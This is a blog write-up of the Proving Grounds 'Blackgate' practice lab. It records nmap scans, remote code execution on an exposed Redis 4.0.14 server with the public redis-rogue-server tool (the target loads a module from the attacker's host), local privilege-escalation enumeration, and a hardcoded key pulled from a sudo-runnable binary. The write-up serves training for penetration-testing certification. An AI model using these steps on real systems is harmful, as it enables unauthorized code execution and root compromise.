---
layout: post
title:  "Write Up: Proving Grounds Practice - Blackgate"
date:   2024-07-25 16:33:13 -0400
categories: oscp proving-grounds TJNull
---

192.168.169.176

└─$ sudo nmap -sV -sC -p- -oA Blackgate 192.168.169.176 
[sudo] password for kali: 
\\Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 16:15 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 20.14% done; ETC: 16:19 (0:03:06 remaining)
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 38.13% done; ETC: 16:19 (0:02:26 remaining)
Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 41.77% done; ETC: 16:20 (0:02:43 remaining)
Nmap scan report for 192.168.169.176
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 363.62 seconds


==============================================================================================================

Redis key-value store 4.0.14

nmap --script redis-info -sV -p 6379 192.168.169.176

┌──(kali㉿kali)-[~/offsec/pg-practice/Blackgate]
└─$ nmap --script redis-info -sV -p 6379 192.168.169.176
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 16:25 EDT
Nmap scan report for 192.168.169.176
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.14 (64 bits)
| redis-info: 
|   Version: 4.0.14
|   Operating System: Linux 5.8.0-63-generic x86_64
|   Architecture: 64 bits
|   Process ID: 874
|   Used CPU (sys): 0.33
|   Used CPU (user): 0.19
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 882.46K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    192.168.45.213

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds


https://github.com/n0b0dyCN/redis-rogue-server

python3 redis-rogue-server.py --rhost 192.168.169.176 --lhost 192.168.45.213

prudence


getcap -r / 2>/dev/null

/snap/core20/1405/usr/bin/ping cap_net_raw=ep
/usr/bin/traceroute6.iputils cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep



find / -perm -u=s 2>/dev/null | grep -v '^/proc|^/run|^/sys|^/snap'

/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/newgrp
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1

sudo -l 
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin


file /usr/local/bin/redis-status
/usr/local/bin/redis-status: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b3e6813dd295d7429e328f168e6ce260f0ed33f6, for GNU/Linux 3.2.0, not stripped


strings /usr/local/bin/redis-status
/lib64/ld-linux-x86-64.so.2
gets
puts
printf
stderr
system
fwrite
strcmp
__libc_start_main
libc.so.6
GLIBC_2.2.5
__gmon_start__
H=X@@
[]A\A]A^A_
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
/usr/bin/systemctl status redis
Wrong Authorization Key!
Incident has been reported!
:*3$"
GCC: (Ubuntu 10.3.0-1ubuntu1~20.10) 10.3.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/crt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
redis-status.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
gets@@GLIBC_2.2.5
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
fwrite@@GLIBC_2.2.5
__TMC_END__
stderr@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment


sudo redis-status
ClimbingParrotKickingDonkey321
● redis.service - redis service
     Loaded: loaded (/etc/systemd/system/redis.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2024-07-25 20:43:30 UTC; 2min 30s ago
   Main PID: 2223 (sh)
      Tasks: 5 (limit: 1062)
     Memory: 2.0M
     CGroup: /system.slice/redis.service
             ├─2223 [sh]
             ├─2289 sudo redis-status
             ├─2290 redis-status
             ├─2295 sh -c /usr/bin/systemctl status redis
             └─2296 /usr/bin/systemctl status redis

Jul 25 20:43:52 blackgate redis-server[2223]: 2223:S 25 Jul 20:43:52.444 # Wrong signature trying to load DB from file
Jul 25 20:43:52 blackgate redis-server[2223]: 2223:S 25 Jul 20:43:52.444 # Failed trying to load the MASTER synchronization DB from disk
Jul 25 20:43:52 blackgate redis-server[2223]: 2223:S 25 Jul 20:43:52.570 * Connecting to MASTER 192.168.45.213:21000
Jul 25 20:43:52 blackgate redis-server[2223]: 2223:S 25 Jul 20:43:52.570 * MASTER <-> SLAVE sync started
Jul 25 20:43:52 blackgate redis-server[2223]: 2223:S 25 Jul 20:43:52.689 * Non blocking connect for SYNC fired the event.
Jul 25 20:43:54 blackgate redis-server[2223]: 2223:S 25 Jul 20:43:54.339 * Module 'system' loaded from ./exp.so
Jul 25 20:43:54 blackgate redis-server[2223]: 2223:M 25 Jul 20:43:54.455 # Setting secondary replication ID to ee2acdde5f73ed057b921cc0378c58d9c0832791, valid up to offset: 1. New replication ID is 3ddba532ddf970f8d9867e2c66b5ce9ac954b005
Jul 25 20:43:54 blackgate redis-server[2223]: 2223:M 25 Jul 20:43:54.455 * MASTER MODE enabled (user request from 'id=3 addr=192.168.45.213:43304 fd=8 name= age=6 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=slaveof')
Jul 25 20:45:49 blackgate sudo[2289]: prudence : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/local/bin/redis-status
Jul 25 20:45:49 blackgate sudo[2289]: pam_unix(sudo:session): session opened for user root by (uid=0)
[*] Redis Uptime



python3 -c 'import pty; pty.spawn("/bin/bash")'




